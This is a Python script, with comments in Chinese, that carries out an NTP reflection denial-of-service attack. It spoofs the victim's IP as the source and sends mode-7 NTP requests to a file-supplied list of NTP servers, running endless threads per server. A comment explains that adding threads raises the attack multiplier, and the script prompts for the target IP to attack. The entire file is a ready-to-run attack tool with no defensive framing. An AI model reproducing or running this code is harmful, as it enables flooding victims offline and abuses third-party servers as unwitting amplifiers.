from scapy.layers.inet import IP, UDP
from scapy.layers.ntp import NTP
from scapy.all import send
from random import randint
import threading
import time


def send_reflection_attack(ntp_server, target):
    while True:
        try:
            sport = randint(40000, 50000)  # 选择40000到50000之间的随机端口
            packet = IP(dst=ntp_server, src=target) / UDP(sport=sport, dport=123) / NTP(version=2, mode=7, stratum=0, poll=3, precision=42)
            send(packet)
            time.sleep(0.01)
        except:
            pass


def execute_attack(target, filename="final.txt"):
    with open(filename, "r") as file:
        for line in file:
            ntp_server = line.strip()
            # 为每个NTP服务器实例化一个线程。如果要调高攻击倍率，可以增加线程数量
            thread = threading.Thread(target=send_reflection_attack, args=(ntp_server, target))
            thread.start()


if __name__ == "__main__":
    # 请输入要攻击的目标IP
    target = input("请输入要攻击的目标IP: ")
    execute_attack(target)